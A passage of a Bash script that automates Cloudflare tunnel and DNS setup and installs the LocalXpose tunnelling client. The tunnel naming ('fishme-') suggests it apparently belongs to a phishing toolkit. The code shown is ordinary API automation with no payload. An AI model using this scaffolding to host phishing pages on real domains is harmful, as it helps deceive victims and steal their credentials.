cloudflare_login() {
    echo -e "  ${CYAN}[i]${RESET} Cloudflare Account Login"
    echo -e "  ${DIM}Get your API token from: https://dash.cloudflare.com/profile/api-tokens${RESET}"
    echo -e "  ${DIM}Required permissions: Zone - Zone - Read, Account - Account Settings - Read${RESET}"
    echo
    read -p "  ${CYAN}[?]${RESET} Enter Cloudflare API Token: " cf_token
    echo
    
    if [[ -z "$cf_token" ]]; then
        echo -e "  ${RED}[!]${RESET} No token provided."
        return 1
    fi
    if [[ ! "$cf_token" =~ ^[A-Za-z0-9_-]+$ ]]; then
        echo -e "  ${RED}[!]${RESET} Invalid token format. Token should only contain alphanumeric characters, underscores, and hyphens."
        return 1
    fi
    echo -e "  ${DIM}[~]${RESET} Validating token..."
    local response
    response=$(curl -s -w "\n%{http_code}" -X GET "https://api.cloudflare.com/client/v4/zones" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" 2>/dev/null)
    
    local http_code
    http_code=$(echo "$response" | tail -n1)
    response=$(echo "$response" | head -n-1)
    
    if [[ "$http_code" == "200" ]] && echo "$response" | grep -q '"success":true'; then
        echo -e "  ${GREEN}[+]${RESET} Authentication successful!"
        echo "$cf_token" > "${BASE_DIR}/.cf_token"
        chmod 600 "${BASE_DIR}/.cf_token"
        return 0
    else
        echo -e "  ${RED}[!]${RESET} Authentication failed."
        echo -e "  ${DIM}HTTP Status: ${http_code}${RESET}"
        
        # Parse error message from response
        local error_msg
        error_msg=$(echo "$response" | grep -oP '"message":"[^"]+"' | cut -d'"' -f4 | head -1)
        
        if [[ -n "$error_msg" ]]; then
            echo -e "  ${DIM}Error: ${error_msg}${RESET}"
        fi
        
        if [[ "$http_code" == "401" ]]; then
            echo -e "  ${DIM}Tip: Make sure your token has the correct permissions:${RESET}"
            echo -e "  ${DIM}  - Zone - Zone - Read${RESET}"
            echo -e "  ${DIM}  - Account - Account Settings - Read${RESET}"
        fi
        
        return 1
    fi
}

cloudflare_list_domains() {
    local cf_token_file="${BASE_DIR}/.cf_token"
    if [[ ! -f "$cf_token_file" ]]; then
        echo -e "  ${RED}[!]${RESET} Not logged in. Please login first."
        return 1
    fi
    
    local cf_token
    cf_token=$(cat "$cf_token_file")
    
    local response
    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?per_page=100" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" 2>/dev/null)
    
    if ! echo "$response" | grep -q '"success":true'; then
        echo -e "  ${RED}[!]${RESET} Failed to fetch domains. Token may be invalid."
        return 1
    fi
    
    # Extract domain names
    local domains
    domains=$(echo "$response" | grep -oP '"name":"[^"]+"' | cut -d'"' -f4 | sort)
    
    if [[ -z "$domains" ]]; then
        echo -e "  ${RED}[!]${RESET} No domains found in your account."
        return 1
    fi
    
    echo "$domains"
    return 0
}

cloudflare_select_domain() {
    local cf_token_file="${BASE_DIR}/.cf_token"
    if [[ ! -f "$cf_token_file" ]]; then
        echo -e "  ${RED}[!]${RESET} Not logged in. Please login first."
        return 1
    fi
    
    local domains
    domains=$(cloudflare_list_domains)
    if [[ $? -ne 0 ]]; then
        return 1
    fi
    
    echo
    echo -e "${CYAN}══════════════════════════════════════════════════════════════${RESET}"
    echo -e "${CYAN}         SELECT DOMAIN FOR TUNNEL         ${RESET}"
    echo -e "${CYAN}══════════════════════════════════════════════════════════════${RESET}"
    echo
    
    local i=1
    local domain_array=()
    while IFS= read -r domain; do
        domain_array+=("$domain")
        printf "  ${GREEN}%-3s${RESET}  ${BOLD}%-40s${RESET}\n" "[$i]" "$domain"
        ((i++))
    done <<< "$domains"
    
    echo
    echo -e "${CYAN}──────────────────────────────────────────────────────────────${RESET}"
    read -p "  ${CYAN}[?]${RESET} Enter option number: " opt
    
    if [[ "${opt}" =~ ^[0-9]+$ && ${opt} -ge 1 && ${opt} -le ${#domain_array[@]} ]]; then
        SELECTED_DOMAIN="${domain_array[$((opt-1))]}"
        SELECTED_ZONE_ID=$(cloudflare_get_zone_id "$SELECTED_DOMAIN")
        echo -e "  ${GREEN}[+]${RESET} Selected domain: ${BOLD}${SELECTED_DOMAIN}${RESET}"
        return 0
    else
        echo -e "  ${RED}[!]${RESET} Invalid option."
        return 1
    fi
}

cloudflare_get_zone_id() {
    local domain="$1"
    local cf_token_file="${BASE_DIR}/.cf_token"
    local cf_token
    cf_token=$(cat "$cf_token_file")
    
    local response
    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=${domain}" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" 2>/dev/null)
    
    local zone_id
    zone_id=$(echo "$response" | grep -oP '"id":"[^"]+"' | head -1 | cut -d'"' -f4)
    
    if [[ -n "$zone_id" ]]; then
        echo "$zone_id"
        return 0
    else
        return 1
    fi
}

cloudflare_get_account_id() {
    local cf_token_file="${BASE_DIR}/.cf_token"
    local cf_token
    cf_token=$(cat "$cf_token_file")
    
    local response
    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" 2>/dev/null)
    
    local account_id
    account_id=$(echo "$response" | grep -oP '"id":"[^"]+"' | head -1 | cut -d'"' -f4)
    
    if [[ -n "$account_id" ]]; then
        echo "$account_id"
        return 0
    else
        return 1
    fi
}

cloudflare_create_tunnel() {
    local account_id="$1"
    local subdomain="$2"
    local cf_token_file="${BASE_DIR}/.cf_token"
    local cf_token
    cf_token=$(cat "$cf_token_file")
    local tunnel_name="fishme-${subdomain}-$(date +%s)"
    local response
    response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/accounts/${account_id}/tunnels" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" \
        --data "{\"name\":\"${tunnel_name}\"}" 2>/dev/null)
    
    if ! echo "$response" | grep -q '"success":true'; then
        echo -e "  ${RED}[!]${RESET} Failed to create tunnel."
        return 1
    fi
    
    local tunnel_id
    tunnel_id=$(echo "$response" | grep -oP '"id":"[^"]+"' | head -1 | cut -d'"' -f4)
    
    echo "$tunnel_id"
    return 0
}

cloudflare_create_dns_record() {
    local zone_id="$1"
    local domain="$2"
    local tunnel_id="$3"
    local cf_token_file="${BASE_DIR}/.cf_token"
    local cf_token
    cf_token=$(cat "$cf_token_file")
    local response
    response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/${zone_id}/dns_records" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" \
        --data "{\"type\":\"CNAME\",\"name\":\"${domain}\",\"content\":\"${tunnel_id}.cfargotunnel.com\",\"ttl\":120,\"proxied\":true}" 2>/dev/null)
    
    if ! echo "$response" | grep -q '"success":true'; then
        echo -e "  ${RED}[!]${RESET} Failed to create DNS record."
        return 1
    fi
    
    return 0
}

cloudflare_get_tunnel_token() {
    local account_id="$1"
    local tunnel_id="$2"
    local cf_token_file="${BASE_DIR}/.cf_token"
    local cf_token
    cf_token=$(cat "$cf_token_file")
    local response
    response=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/${account_id}/tunnels/${tunnel_id}/token" \
        -H "Authorization: Bearer $cf_token" \
        -H "Content-Type: application/json" 2>/dev/null)
    
    if ! echo "$response" | grep -q '"success":true'; then
        echo -e "  ${RED}[!]${RESET} Failed to get tunnel token."
        return 1
    fi
    
    local tunnel_token
    tunnel_token=$(echo "$response" | grep -oP '"token":"[^"]+"' | cut -d'"' -f4)
    
    if [[ -n "$tunnel_token" ]]; then
        echo "$tunnel_token"
        return 0
    else
        return 1
    fi
}

install_loclx() {
    echo -e "  ${CYAN}[i]${RESET} Installing LocalXpose (loclx)..."
    local arch url zip_path extract_dir
    arch=$(uname -m)
    case "$arch" in
        x86_64)  url="https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ;;
        aarch64) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" ;;
        armv7l|armv6l) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ;;
        *)       echo -e "  ${RED}[!]${RESET} Unsupported architecture: $arch"; return 1 ;;
    esac
    zip_path=$(mktemp)
    extract_dir=$(mktemp -d)
    if curl -L "$url" -o "$zip_path" --progress-bar; then
        if unzip -o -j "$zip_path" -d "$extract_dir" >/dev/null 2>&1 && [[ -f "${extract_dir}/loclx" ]]; then
            chmod +x "${extract_dir}/loclx"
            sudo mv "${extract_dir}/loclx" /usr/local/bin/loclx 2>/dev/null || mv "${extract_dir}/loclx" "${BASE_DIR}/loclx"
            rm -rf "$extract_dir" "$zip_path"
            echo -e "  ${GREEN}[+]${RESET} loclx installed successfully."
            return 0
        fi
    fi
    rm -rf "$extract_dir" "$zip_path"
    echo -e "  ${RED}[!]${RESET} Failed to download or extract loclx."
    return 1
}

check_loclx_auth() {
    local lx_bin="$1"
